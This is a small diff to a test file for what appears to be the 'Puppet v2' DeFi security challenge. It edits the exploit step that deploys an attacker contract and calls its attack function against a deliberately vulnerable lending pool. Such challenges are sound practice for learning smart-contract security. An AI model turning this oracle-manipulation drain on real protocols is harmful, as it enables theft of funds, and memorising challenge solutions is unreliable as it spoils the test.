@@ -84,8 +84,8 @@ describe('[Challenge] Puppet v2', function () {
         /** CODE YOUR EXPLOIT HERE */
         this.attackContract = await (await ethers.getContractFactory('Puppet2Attacker', attacker))
             .deploy(this.lendingPool.address, this.token.address, this.weth.address, this.uniswapFactory.address, this.uniswapRouter.address);
-        await this.token.transfer(this.attackContract.address, ATTACKER_INITIAL_TOKEN_BALANCE);
-        await this.attackContract.attack(POOL_INITIAL_TOKEN_BALANCE, ATTACKER_INITIAL_TOKEN_BALANCE, {value: ethers.utils.parseEther('20')});
+        await this.token.connect(attacker).transfer(this.attackContract.address, ATTACKER_INITIAL_TOKEN_BALANCE);
+        await this.attackContract.attack(POOL_INITIAL_TOKEN_BALANCE, ATTACKER_INITIAL_TOKEN_BALANCE, {value: ethers.utils.parseEther('19')});
     });
 
     after(async function () {
